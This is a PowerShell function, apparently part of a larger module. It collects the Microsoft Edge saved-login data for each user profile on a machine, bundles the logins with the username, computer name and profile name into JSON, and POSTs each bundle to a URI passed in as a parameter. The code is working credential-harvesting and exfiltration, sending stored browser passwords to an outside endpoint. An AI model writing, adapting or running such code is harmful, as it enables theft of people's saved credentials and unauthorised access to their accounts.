function Send-EdgeLogins {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [string]
        $FunctionUri
    )

    $paths = Get-EdgeLoginPaths
    $logins = $paths | ForEach-Object { 
        [pscustomobject]@{
            UserName = $_.username
            ComputerName = $env:COMPUTERNAME
            Logins = @(Get-EdgeLogins -LoginDataFile $_.EdgeLoginDatapath)
            ProfileName = $_.ProfileName
            FileSize = (Get-Item $_.EdgeLoginDatapath | Select-Object -ExpandProperty Length)
        }
    }
    $logins | ForEach-Object {
        $requestBody = $_ | ConvertTo-Json -Depth 5
        Invoke-RestMethod -Uri $FunctionUri -Method Post -Body $requestBody
    }
        
}